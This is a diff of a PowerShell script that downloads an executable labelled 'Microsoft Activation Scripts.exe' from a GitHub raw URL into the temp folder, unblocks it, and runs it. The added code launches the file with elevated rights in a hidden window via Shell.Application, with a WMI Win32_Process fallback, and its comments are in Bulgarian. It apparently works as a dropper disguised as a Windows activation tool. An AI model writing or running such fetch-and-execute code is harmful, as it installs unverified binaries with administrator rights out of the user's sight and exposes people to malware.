@@ -2,9 +2,12 @@ $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/m
 $tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $tempFile
+Unblock-File -Path $tempFile
 
-Unblock-File -Path $tempFile -ErrorAction SilentlyContinue
+# Метод 1: Използване на COM обект Shell.Application
+$shell = New-Object -ComObject Shell.Application
+$shell.ShellExecute($tempFile, "", $env:TEMP, "runas", 0)
 
-Remove-Item "$tempFile:Zone.Identifier" -Force -ErrorAction SilentlyContinue
-
-Start-Process $tempFile -Verb RunAs -WorkingDirectory "$env:TEMP" -Wait
+# Или метод 2: Директно чрез WMI
+$processClass = [WMICLASS]"root\cimv2:Win32_Process"
+$processClass.Create("`"$tempFile`"", $env:TEMP, $null) | Out-Null
